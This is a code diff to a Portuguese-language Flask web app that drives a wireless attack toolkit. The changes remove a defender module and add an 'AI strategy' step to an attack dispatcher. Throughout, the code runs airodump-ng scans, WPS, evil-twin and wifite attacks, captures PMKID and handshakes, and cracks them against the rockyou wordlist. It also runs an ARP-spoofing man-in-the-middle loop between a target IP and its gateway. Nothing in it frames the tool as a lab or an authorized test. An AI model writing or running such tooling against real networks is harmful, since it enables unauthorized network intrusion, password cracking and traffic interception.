@@ -11,7 +11,6 @@ import wifi_auditor
 from wifi_auditor import run_command, set_monitor_mode, set_managed_mode, capture_pmkid, capture_handshake, crack_hash, identify_vendor, analyze_vulnerabilities, capture_wps, fix_drivers_wifi6, start_ghost_attack, boost_signal, start_wifite_expert, start_evil_twin, capture_vetor_x, run_autopilot
 from dsi_sniffer import DSISniffer, spoof, scan_network
 from dsi_twin import DSITwin
-from dsi_defender import DSIDefender
 from dsi_ai import DSIAI
 
 app = Flask(__name__)
@@ -71,6 +70,7 @@ def start_scan():
     global SCAN_PROCESS, CURRENT_MONITOR_IFACE
     if not CURRENT_MONITOR_IFACE: return jsonify({"status": "error", "message": "Não armado."}), 400
     boost_signal(CURRENT_MONITOR_IFACE)
+    add_log("Radar Turbo (2.4/5/6GHz) ACIONADO.", log_type="cmd", is_command=True)
     run_command(f"rm -f {CSV_PREFIX}-01.*")
     cmd = f"airodump-ng --band abg --update 1 --manufacturer --output-format csv -w {CSV_PREFIX} {CURRENT_MONITOR_IFACE}"
     SCAN_PROCESS = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -96,11 +96,7 @@ def get_networks():
                     if in_ap and not row[0].strip() == "Station MAC":
                         bssid = row[0].strip(); essid = row[13].strip()
                         name = essid if (essid and essid != "\x00") else f"<Oculta: {bssid[-5:]}>"
-                        networks.append({
-                            'bssid': bssid, 'signal': row[8].strip(),
-                            'channel': row[3].strip(), 'privacy': row[5].strip(), 
-                            'essid': name, 'vendor': identify_vendor(bssid)
-                        })
+                        networks.append({'bssid': bssid, 'signal': row[8].strip(),'channel': row[3].strip(), 'privacy': row[5].strip(), 'essid': name, 'vendor': identify_vendor(bssid)})
                     elif row[0].strip() == "Station MAC": break
         except: pass
     networks.sort(key=lambda x: int(x['signal']) if x['signal'].lstrip('-').isdigit() else -100, reverse=True)
@@ -129,23 +125,33 @@ def stop_defender():
     return jsonify({"status": "success"})
 
 def attack_task(attack_type, bssid, channel, essid, privacy):
-    vendor = identify_vendor(bssid); _, advice = analyze_vulnerabilities(vendor, essid, privacy)
-    add_log(f"COMBATE INICIADO: {essid} ({vendor})", log_type="cmd", is_command=True)
-    add_log(f"DSI INTEL: {advice}")
+    ai_advice = BRAIN.get_strategy(bssid, os.path.exists("/tmp/dsi_injection_ok"))
+    add_log(f"COMBATE INICIADO: {essid} ({identify_vendor(bssid)})", log_type="cmd", is_command=True)
+    add_log(f"DSI NEURAL NET: {ai_advice}", log_type="info")
+    
     prefix = f"web_capture_{essid.replace(' ', '_')}"; cap_file = None
-    if attack_type == 'wps': capture_wps(CURRENT_MONITOR_IFACE, bssid, channel); return
-    if attack_type == 'ghost': start_ghost_attack(CURRENT_MONITOR_IFACE, essid); return
-    if attack_type == 'wifite': start_wifite_expert(CURRENT_MONITOR_IFACE); return
-    if attack_type == 'autopilot': cap_file = run_autopilot(CURRENT_MONITOR_IFACE, {"essid":essid, "bssid":bssid, "channel":channel})
-    elif attack_type == 'vetorx': cap_file = capture_vetor_x(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
-    elif attack_type == 'pmkid':
-        cap_file = capture_pmkid(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
-        if not cap_file: cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
-    else: cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
+    
+    if attack_type == 'autopilot':
+        cap_file = run_autopilot(CURRENT_MONITOR_IFACE, {"essid":essid, "bssid":bssid, "channel":channel})
+    elif attack_type == 'wps':
+        if capture_wps(CURRENT_MONITOR_IFACE, bssid, channel): cap_file = "WPS_SUCCESS"
+    elif attack_type == 'ghost':
+        start_ghost_attack(CURRENT_MONITOR_IFACE, essid)
+    elif attack_type == 'wifite':
+        start_wifite_expert(CURRENT_MONITOR_IFACE)
+    elif attack_type == 'vetorx':
+        cap_file = capture_vetor_x(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
+    else: # handshake, pmkid...
+        cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
+        
     if cap_file:
-        wordlist = "/usr/share/wordlists/rockyou.txt"
-        if os.path.exists(wordlist): crack_hash(cap_file, wordlist, bssid)
-    else: add_log("Alvo resistiu.", log_type="error")
+        BRAIN.learn(bssid, essid, attack_type, True)
+        if cap_file != "WPS_SUCCESS":
+            wordlist = "/usr/share/wordlists/rockyou.txt"
+            if os.path.exists(wordlist): crack_hash(cap_file, wordlist, bssid)
+    else:
+        BRAIN.learn(bssid, essid, attack_type, False)
+        add_log("Alvo resistiu.", log_type="error")
 
 @app.route('/api/attack', methods=['POST'])
 def launch_attack():
@@ -172,7 +178,6 @@ def start_mitm():
     data = request.get_json(); iface = CURRENT_MONITOR_IFACE or CURRENT_MANAGED_IFACE or "wlan0"
     def run_spoof():
         global SPOOF_ACTIVE; SPOOF_ACTIVE = True
-        add_log(f"Spoofing via {iface}...", log_type="cmd", is_command=True)
         while SPOOF_ACTIVE:
             if not spoof(data['target_ip'], data['gateway_ip'], iface): break
             time.sleep(2)
